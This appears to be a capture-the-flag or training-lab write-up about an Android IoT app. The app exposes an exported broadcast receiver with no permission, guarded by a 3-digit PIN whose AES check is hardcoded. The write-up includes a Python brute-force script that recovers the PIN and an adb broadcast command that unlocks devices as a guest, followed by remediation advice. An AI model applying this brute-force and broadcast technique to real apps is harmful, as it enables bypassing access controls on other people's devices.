
# 🔐 Android Application Vulnerability: Insecure Exported Broadcast Receiver

## 📝 Summary

The target Android application requires user authentication. After logging in, users see two options: `Setup` and `Master Switch`. When using the guest account, attempting to enable the **Master Switch** prompts for a 3-digit code, but it cannot be activated.

<img width="430" height="545" alt="image" src="https://github.com/user-attachments/assets/e9fbcae2-6b6d-4b81-95f6-6e458c63a2b3" />


## 📱 App Behavior & Restrictions

Inside the **Setup** activity, several devices — such as the **AC**, **TV**, and **Speaker** — remain disabled unless the **Master Switch** is successfully turned on.

## 🔍 Technical Analysis

### 📄 AndroidManifest.xml — Insecure Broadcast Receiver

```xml
<receiver
            android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="MASTER_ON"/>
            </intent-filter>
        </receiver>
```

- The `CommunicationManager` receiver listens for the `MASTER_ON` action.
- It is **exported without any permissions**, meaning **any app** on the device can interact with it.

### 📦 Source Code — CommunicationManager.java

The receiver processes the `MASTER_ON` broadcast in the `CommunicationManager` class, where the intent action is performed.

```java
public final BroadcastReceiver initialize(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager.initialize.1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
                    int key = intent.getIntExtra("key", 0);
                    if (context2 != null) {
                        if (Checker.INSTANCE.check_key(key)) {
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                            Toast.makeText(context2, "All devices are turned on", 1).show();
                        } else {
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();
                        }
                    }
                }
            }
        };
```

The key validation logic is handled by the `check_key()` method, which performs AES decryption. Also, the encrypted value is hardcoded as "ds" String.

```java
public final class Checker {
    public static final Checker INSTANCE = new Checker();
    private static final String algorithm = "AES";
    private static final String ds = "OSnaALIWUkpOziVAMycaZQ==";

    private Checker() {
    }

    public final boolean check_key(int key) {
        try {
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    public final String decrypt(String ds2, int key) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException {
        Intrinsics.checkNotNullParameter(ds2, "ds");
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
        cipher.init(2, secretKey);
        if (Build.VERSION.SDK_INT >= 26) {
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
            Intrinsics.checkNotNull(decryptedBytes);
            return new String(decryptedBytes, Charsets.UTF_8);
        }
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
    }
```
The `decrypt()` function converts the 3-digit key to a 16-byte AES key before decrypting the string.

### 🔐 AES Key Derivation

The 3-digit code is transformed into a 16-byte key like so:

```java
private final SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, algorithm);
    }
```

### 🚀 Exploit Strategy

We brute-force all 3-digit combinations (000–999), generate the corresponding AES key, and decrypt the encrypted string. The correct key results in the decrypted string `"master_on"`.

```python
from Crypto.Cipher import AES
import base64

def generate_key(static_key: int) -> bytes:
    key_str = str(static_key)
    key_bytes = key_str.encode('utf-8')
    
    padded_key = key_bytes + bytes(16 - len(key_bytes))
    return padded_key

def try_decrypt_all(ciphertext_b64: str):
    ciphertext = base64.b64decode(ciphertext_b64)
    for i in range(1000): 
        key = generate_key(i)
        try:
            cipher = AES.new(key, AES.MODE_ECB)
            decrypted = cipher.decrypt(ciphertext)
            padding_len = decrypted[-1]
            if 1 <= padding_len <= 16:
                decrypted = decrypted[:-padding_len]
                decrypted_text = decrypted.decode('utf-8')
                print(f"✅ Clave: {i:03} => Texto descifrado: '{decrypted_text}'")
        except Exception:
            continue  


ciphertext_b64 = "OSnaALIWUkpOziVAMycaZQ=="
try_decrypt_all(ciphertext_b64)
```

<img width="647" height="213" alt="image" src="https://github.com/user-attachments/assets/0135ab89-27a1-41b6-b887-6c8a27f3de8b" />


✅ The valid 3-digit key is:

```
345
```

### 📡 Exploiting the Broadcast Receiver

We use `adb` to send the broadcast intent with the correct key:

```bash
adb shell am broadcast -a MASTER_ON --ei key 345
```

After sending this intent, all previously locked devices are now turned on.

## ✅ Result

> **All devices are ON**, including AC, TV, and Speaker, even as a guest user.


<img width="500" height="464" alt="image" src="https://github.com/user-attachments/assets/584d879c-9f09-4807-bf1e-877a5bef4bab" />

<img width="436" height="542" alt="image" src="https://github.com/user-attachments/assets/f817d4aa-3305-483e-be3a-3a79693d9ff4" />

<img width="395" height="539" alt="image" src="https://github.com/user-attachments/assets/f9a7c357-55ea-4195-b310-746a8dba01b9" />

## 🛡️ Security Impact

- **Local Privilege Escalation**: Any unprivileged app can enable restricted functionality by sending a crafted broadcast.
- No permissions required → attack is trivial if app is installed.

## 🛠️ Recommendations

- Set `android:exported="false"` for internal broadcast receivers.
- Use permission protection with `android:permission` attribute.
- Avoid static broadcasts for sensitive actions. Prefer runtime registration.

## 🏷️ Tags

`Android Security` `Broadcast Receiver` `AES` `Reverse Engineering` `Privilege Escalation`

